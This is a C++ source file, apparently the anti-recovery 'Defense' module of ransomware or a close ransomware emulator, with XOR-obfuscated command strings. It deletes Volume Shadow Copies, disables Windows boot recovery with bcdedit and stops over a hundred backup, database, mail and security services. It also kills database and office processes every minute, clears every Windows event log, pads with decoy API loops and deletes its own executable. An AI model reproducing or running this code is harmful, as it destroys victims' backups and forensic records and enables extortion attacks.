#include "defense.hpp"

#define DUMMY_DEVICE XOR_LIT("00-000-0000-000-00")
#define DUMMY_ATOM XOR_LIT("------")
const std::vector<std::string> SHADOW_COMMANDS = {
    XOR_LIT("vssadmin Delete Shadows /all /quiet"),
    XOR_LIT("vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB"),
    XOR_LIT("vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded"),
    XOR_LIT("vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB"),
    XOR_LIT("vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded"),
    XOR_LIT("vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB"),
    XOR_LIT("vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded"),
    XOR_LIT("vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB"),
    XOR_LIT("vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded"),
    XOR_LIT("vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB"),
    XOR_LIT("vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded"),
    XOR_LIT("vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB"),
    XOR_LIT("vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded"),
    XOR_LIT("vssadmin Delete Shadows /all /quiet")
};
const std::vector<std::string> SEC_SERVICE_CMDS = {
    XOR_LIT("net stop SQLAgent$SYSTEM_BGC /y"),
    XOR_LIT("net stop SQLAgent$ECWDB2 /y"),
    XOR_LIT("net stop \"Zoolz 2 Service\" /y"),
    XOR_LIT("net stop EraserSvc11710 /y"),
    XOR_LIT("net stop SQLAgent$PROFXENGAGEMENT /y"),
    XOR_LIT("net stop MSSQLFDLauncher$TPSAMA /y"),
    XOR_LIT("net stop SstpSvc /y"),
    XOR_LIT("net stop MSOLAP$SQL_2008 /y"),
    XOR_LIT("net stop sacsvr /y"),
    XOR_LIT("net stop VeeamNFSSvc /y"),
    XOR_LIT("net stop VeeamTransportSvc /y"),
    XOR_LIT("net stop MSSQLSERVER /y"),
    XOR_LIT("net stop MSSQLServerADHelper100 /y"),
    XOR_LIT("net stop wbengine /y"),
    XOR_LIT("net stop SQLWriter /y"),
    XOR_LIT("net stop MSSQLFDLauncher$TPS /y"),
    XOR_LIT("net stop ReportServer$TPSAMA /y"),
    XOR_LIT("net stop MSSQL$SYSTEM_BGC /y"),
    XOR_LIT("net stop VeeamBrokerSvc /y"),
    XOR_LIT("net stop MSSQLFDLauncher$PROFXENGAGEMENT /y"),
    XOR_LIT("net stop VeeamDeploymentService /y"),
    XOR_LIT("net stop SQLAgent$TPS /y"),
    XOR_LIT("net stop DCAgent /y"),
    XOR_LIT("net stop MSSQLFDLauncher$SBSMONITORING /y"),
    XOR_LIT("net stop MySQL80 /y"),
    XOR_LIT("net stop MSOLAP$SYSTEM_BGC /y"),
    XOR_LIT("net stop ReportServer$TPS /y"),
    XOR_LIT("net stop MSSQL$ECWDB2 /y"),
    XOR_LIT("net stop SQLSERVERAGENT /y"),
    XOR_LIT("net stop SMTPSvc /y"),
    XOR_LIT("net stop MSSQL$VEEAMSQL2008R2 /y"),
    XOR_LIT("net stop MSExchangeSA /y"),
    XOR_LIT("net stop MSSQLServerADHelper /y"),
    XOR_LIT("net stop SQLTELEMETRY /y"),
    XOR_LIT("net stop POP3Svc /y"),
    XOR_LIT("net stop MSOLAP$TPSAMA /y"),
    XOR_LIT("net stop \"Veeam Backup Catalog Data Service\" /y"),
    XOR_LIT("net stop MSSQL$SBSMONITORING /y"),
    XOR_LIT("net stop ReportServer$SYSTEM_BGC /y"),
    XOR_LIT("net stop MySQL57 /y"),
    XOR_LIT("net stop VeeamMountSvc /y"),
    XOR_LIT("net stop MsDtsServer110 /y"),
    XOR_LIT("net stop SQLAgent$BKUPEXEC /y"),
    XOR_LIT("net stop UI0Detect /y"),
    XOR_LIT("net stop ReportServer /y"),
    XOR_LIT("net stop SQLTELEMETRY$ECWDB2 /y"),
    XOR_LIT("net stop MSSQLFDLauncher$SYSTEM_BGC /y"),
    XOR_LIT("net stop MSSQL$BKUPEXEC /y"),
    XOR_LIT("net stop SQLAgent$PRACTTICEBGC /y"),
    XOR_LIT("net stop MSExchangeSRS /y"),
    XOR_LIT("net stop SQLAgent$VEEAMSQL2008R2 /y"),
    XOR_LIT("net stop VeeamCatalogSvc /y"),
    XOR_LIT("net stop SQLAgent$SHAREPOINT /y"),
    XOR_LIT("net stop NetMsmqActivator /y"),
    XOR_LIT("net stop MsDtsServer /y"),
    XOR_LIT("net stop SQLAgent$SQL_2008 /y"),
    XOR_LIT("net stop SDRSVC /y"),
    XOR_LIT("net stop IISAdmin /y"),
    XOR_LIT("net stop SQLAgent$PRACTTICEMGT /y"),
    XOR_LIT("net stop SQLAgent$VEEAMSQL2008R2 /y"),
    XOR_LIT("net stop VeeamHvIntegrationSvc /y"),
    XOR_LIT("net stop W3Svc /y"),
    XOR_LIT("net stop \"SQLsafe Backup Service\" /y"),
    XOR_LIT("net stop SQLAgent$CXDB /y"),
    XOR_LIT("net stop SQLBrowser /y"),
    XOR_LIT("net stop MSSQLFDLauncher$SQL_2008 /y"),
    XOR_LIT("net stop VeeamBackupSvc /y"),
    XOR_LIT("net stop SQLAgent$VEEAMSQL2012 /y"),
    XOR_LIT("net stop MSExchangeMGMT /y"),
    XOR_LIT("net stop SamSs /y"),
    XOR_LIT("net stop MSExchangeES /y"),
    XOR_LIT("net stop MSSQL$TPSAMA /y"),
    XOR_LIT("net stop VeeamCloudSvc /y"),
    XOR_LIT("net stop MSSQL$PRACTICEMGT /y"),
    XOR_LIT("net stop SQLAgent$TPSAMA /y"),
    XOR_LIT("net stop SQLAgent$SBSMONITORING /y"),
    XOR_LIT("net stop MSSQL$VEEAMSQL2012 /y"),
    XOR_LIT("net stop SQLSafeOLRService /y"),
    XOR_LIT("net stop VeeamEnterpriseManagerSvc /y"),
    XOR_LIT("net stop SQLAgent$SQLEXPRESS /y"),
    XOR_LIT("net stop OracleClientCache80 /y"),
    XOR_LIT("net stop MSSQL$PROFXENGAGEMENT /y"),
    XOR_LIT("net stop IMAP4Svc /y"),
    XOR_LIT("net stop MSExchangeIS /y"),
    XOR_LIT("net stop MSSQLFDLauncher /y"),
    XOR_LIT("net stop MSExchangeMTA /y"),
    XOR_LIT("net stop \"SQL Backups\" /y"),
    XOR_LIT("net stop MSSQL$TPS /y"),
    XOR_LIT("net stop MsDtsServer100 /y"),
    XOR_LIT("net stop MSSQL$SHAREPOINT /y"),
    XOR_LIT("net stop msftesql$PROD /y"),
    XOR_LIT("net stop mozyprobackup /y"),
    XOR_LIT("net stop MSSQL$SQL_2008 /y"),
    XOR_LIT("net stop SNAC /y"),
    XOR_LIT("net stop ReportServer$SQL_2008 /y"),
    XOR_LIT("net stop MSSQL$SQLEXPRESS /y"),
    XOR_LIT("net stop MSSQL$PRACTTICEBGC /y"),
    XOR_LIT("net stop VeeamRESTSvc /y"),
    XOR_LIT("net stop MMS /y"),
    XOR_LIT("net stop RESvc /y"),
    XOR_LIT("net stop MSSQL$VEEAMSQL2008R2 /y"),
    XOR_LIT("net stop MSSQLFDLauncher$SHAREPOINT /y"),
    XOR_LIT("net stop \"SQLsafe Filter Service\" /y"),
    XOR_LIT("net stop MSSQL$PROD /y"),
    XOR_LIT("net stop SQLAgent$PROD /y"),
    XOR_LIT("net stop MSOLAP$TPS /y"),
    XOR_LIT("net stop VeeamDeploySvc /y"),
    XOR_LIT("net stop MSSQLServerOLAPService /y")
};
const std::vector<std::string> BOOT_COMMANDS = {
    XOR_LIT("bcdedit /set {default} recoveryenabled No"),
    XOR_LIT("bcdedit /set {default} bootstatuspolicy IgnoreAllFailures")
};
const std::vector<size_t> PROCESS_HASHES {
    size_t{16281293070074120544}, // MSFTESQL.EXE
    size_t{16829329693136189562}, // SQLAGENT.EXE
    size_t{10499334249069378387}, // SQLBROSWER.EXE
    size_t{11508240072581276830}, // SQLWRITER.EXE
    size_t{14305791034790404469}, // OCSSD.EXE
    size_t{4820415679919021089}, // DBSNMP.EXE
    size_t{9528028092764603317}, // SYNCTIME.EXE
    size_t{17329912228661731876}, // AGNTSVC.EXEISQLPLUSSVC.EXE
    size_t{13713382588356297176}, // XFSSVCCON.EXE
    size_t{14052787549782092153}, // SQLSERVR.EXE
    size_t{13747337072210852190}, // MYDESKTOPSERVICE.EXE
    size_t{4533004742796687842}, // OCAUTOUPDS.EXE
    size_t{10149053000258913573}, // AGNTSVC.EXEAGNTSVC.EXE
    size_t{8294912360444053557}, // AGNTSVC.EXEENCSVC.EXE
    size_t{12013193785600037418}, // FIREFOXCONFIG.EXE
    size_t{2238791194319893584}, // TBIRDCONFIG.EXE
    size_t{8357582378042808628}, // MYDESKTOPQOS.EXE
    size_t{7509524816998993944}, // OCOMM.EXE
    size_t{10583855369355171445}, // MYSQLD.EXE
    size_t{11035892678985621086}, // MYSQLD-NT.EXE
    size_t{15326735904375601725}, // MYSQLD-OPT.EXE
    size_t{17548764356219288450}, // DBENG50.EXE
    size_t{10323461743281256191}, // SQBCORESERVICE.EXE
    size_t{29208057735154521}, // SCALC.EXE
    size_t{12623956949911419656}, // INFOPATH.EXE
    size_t{15972156786622088865}, // SBASE.EXE
    size_t{11447423468261541601}, // ONENOTE.EXE
    size_t{2985158740914693050}, // OUTLOOK.EXE
    size_t{9122552987235742565}, // SIMPRESS.EXE
    size_t{1014917075874677869}, // STEAM.EXE
    size_t{1472359513367244689}, // THEBAT.EXE
    size_t{5229292355836095427}, // THEBAT64.EXE
    size_t{5120038162267377800}, // THUNDERBIRD.EXE
    size_t{3533335859495134658}, // SDRAW.EXE
    size_t{5860025955385584115}, // SWRITER.EXE
    size_t{4447340544199597388}, // WORDPAD.EXE
    size_t{14929862283577429149}, // SOFFICE.BIN
};


namespace Defense {

    void DummyLoop() {
        for (int i = 0; i < LOOP_COUNT; i++) {
            EraseTape(NULL, 0L, 0);
            DefineDosDeviceA(0L, DUMMY_DEVICE, 0);
            GetACP();
            FindAtomA(DUMMY_ATOM);
        }
    }

    void ExecuteListOfCommands(std::vector<std::string> cmdList) {
        for (const std::string& cmd : cmdList) {
            std::string output = Core::cmdExecuteCommand(cmd);
            std::string message = std::vformat(XOR_LIT("Command: {}. Output: {}"), std::make_format_args(cmd, output));
            XorLogger::LogDebug(message);
        }
    }

    void RemoveShadowCopies() {
        ExecuteListOfCommands(SHADOW_COMMANDS);
    }

    void DisableBootRecovery() {
        ExecuteListOfCommands(BOOT_COMMANDS);
    }

    void StopServices() {
        ExecuteListOfCommands(SEC_SERVICE_CMDS);
    }

    void ClearWindowsEventLogs() {
        XorLogger::LogInfo(XOR_LIT("Attempting to clear event logs."));

        try {
            EVT_HANDLE h_channel_enum = EvtOpenChannelEnum(NULL, 0);
            if (h_channel_enum == NULL) {
                XorLogger::LogError(std::format("{} {}", XOR_LIT("EvtOpenChannelEnum failed with error code"), GetLastError()));
                return;
            }
            DWORD buf_len = 256; // initial size
            DWORD required_size = buf_len;
            std::vector<wchar_t> buffer(required_size);
            DWORD error_code;

            // Loop until EvtNextChannelPath fails with ERROR_NO_MORE_ITEMS
            while(true) {
                if (!EvtNextChannelPath(h_channel_enum, buf_len, &buffer[0], &required_size)) {
                    error_code = GetLastError();
                    if (error_code == ERROR_NO_MORE_ITEMS) {
                        break;
                    } else if (error_code == ERROR_INSUFFICIENT_BUFFER) {
                        // resize buffer
                        buf_len = required_size;
                        buffer.resize(required_size);
                        if (!EvtNextChannelPath(h_channel_enum, buf_len, &buffer[0], &required_size)) {
                            XorLogger::LogError(std::format("{} {}", XOR_LIT("EvtNextChannelPath failed with error code"), GetLastError()));
                            break;
                        }
                    } else {
                        XorLogger::LogError(std::format("{} {}", XOR_LIT("EvtNextChannelPath failed with error code"), GetLastError()));
                        break;
                    }
                }

                // Clear the event log
                LPCWSTR channel_path = (LPCWSTR)(&buffer[0]);
                std::wstring channel_path_wstr(channel_path);
                if (!EvtClearLog(NULL, channel_path, NULL, 0)) {
                    XorLogger::LogError(std::format(
                        "{} {} {} {}", 
                        XOR_LIT("EvtClearLog failed for event channel"),
                        string_util::wstring_to_string(channel_path_wstr),
                        XOR_LIT("with error code"),
                        GetLastError()
                    ));
                } else {
                    XorLogger::LogDebug(std::format(
                        "{} {}", 
                        XOR_LIT("Successfully cleared event logs from event channel"),
                        string_util::wstring_to_string(channel_path_wstr)
                    ));
                }
            }

            // Close handle from EvtOpenChannelEnum when done
            EvtClose(h_channel_enum);
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when clearing event logs."));
        }

        XorLogger::LogInfo(XOR_LIT("Finished attempting to clear event logs."));
    }

    void KillProcess(LPSTR proc_name, DWORD proc_id) {
        HANDLE h_proc = NULL;
        h_proc = OpenProcess(PROCESS_TERMINATE, false, proc_id);

        if (h_proc == NULL) {
            XorLogger::LogError(std::vformat(
                XOR_LIT("OpenProcess failed for process {} (PID {}) with error code: {}"),
                std::make_format_args(
                    proc_name,
                    proc_id,
                    GetLastError()
                )
            ));
        }
        else {
            if (TerminateProcess(h_proc, 9)) {
                XorLogger::LogInfo(std::vformat(
                    XOR_LIT("Terminated process {} with PID {}"),
                    std::make_format_args(
                        proc_name,
                        proc_id
                    )
                ));
            }
            else {
                XorLogger::LogError(std::vformat(
                    XOR_LIT("TerminateProcess failed for process {} (PID {}) with error code: {}"),
                    std::make_format_args(
                        proc_name,
                        proc_id,
                        GetLastError()
                    )
                ));
            }
            CloseHandle(h_proc);
        }
    }

    bool CompareProcess(std::string processName) {
        return Core::CompareHash(processName, PROCESS_HASHES);
    }

    void KillProcesses() {
        WTS_PROCESS_INFO* pWPIs = NULL;
        DWORD dwProcCount = 0;
        if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount)) {
            XorLogger::LogDebug(XOR_LIT("Looking for processes to kill."));
            //Go through all processes retrieved
            bool proc_found = false;
            for (DWORD i = 0; i < dwProcCount; i++) {
                LPSTR proc_name = pWPIs[i].pProcessName;
                DWORD proc_id = pWPIs[i].ProcessId;

                if (CompareProcess(proc_name)) {
                    std::string message = std::vformat(XOR_LIT("Attempting to kill pid {} ({})"), std::make_format_args(proc_id, proc_name));
                    XorLogger::LogDebug(message);
                    KillProcess(proc_name, proc_id);
                    proc_found = true;
                }
            }

            if (!proc_found) {
                XorLogger::LogDebug(XOR_LIT("No processes found to kill."));
            }
        }
        else {
            std::string message = std::vformat(XOR_LIT("Failed to enumerate processes with error code: {}"), std::make_format_args(GetLastError()));
            XorLogger::LogError(message);
        }

        //Free memory
        if (pWPIs) {
            WTSFreeMemory(pWPIs);
            pWPIs = NULL;
        }
    }

    void KillProcessesThread() {
        while (true) {
            KillProcesses();
            std::this_thread::sleep_for(std::chrono::minutes(1));
        }
    }

    void DisableErrors() {
        SetErrorMode(1);
        XorLogger::LogDebug(XOR_LIT("Error message boxes disabled."));
    }
  
    void SelfDestruct(UINT exit_code) {
        try {
            std::wstring short_exe_path = os_util::GetCurrExecutableShortPath();
            
            // Create self destruct process
            wchar_t command_line[MAX_CMD_LINE_LENGTH + 1];
            swprintf_s(command_line, MAX_CMD_LINE_LENGTH, L"cmd.exe /c timeout 7 & del \"%s\"", short_exe_path.c_str());
            DWORD result = Core::SpawnProcessNoWait(command_line);
            if (result != ERROR_SUCCESS) {
                XorLogger::LogError(std::format("{} {}", XOR_LIT("Failed to start self destruct process: CreateProcessW gave error code"), result));
                exit_code = SELF_DESTRUCT_FAILED;
            } else {
                XorLogger::LogDebug(XOR_LIT("Kicked off self destruct process. Terminating."));
            }
        } catch (std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to start self destruct process"), e.what()));
            exit_code = SELF_DESTRUCT_FAILED;
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown error when starting self destruct process."));
            exit_code = SELF_DESTRUCT_FAILED;
        }

        // Terminate self
        TerminateProcess(GetCurrentProcess(), exit_code);
    }
}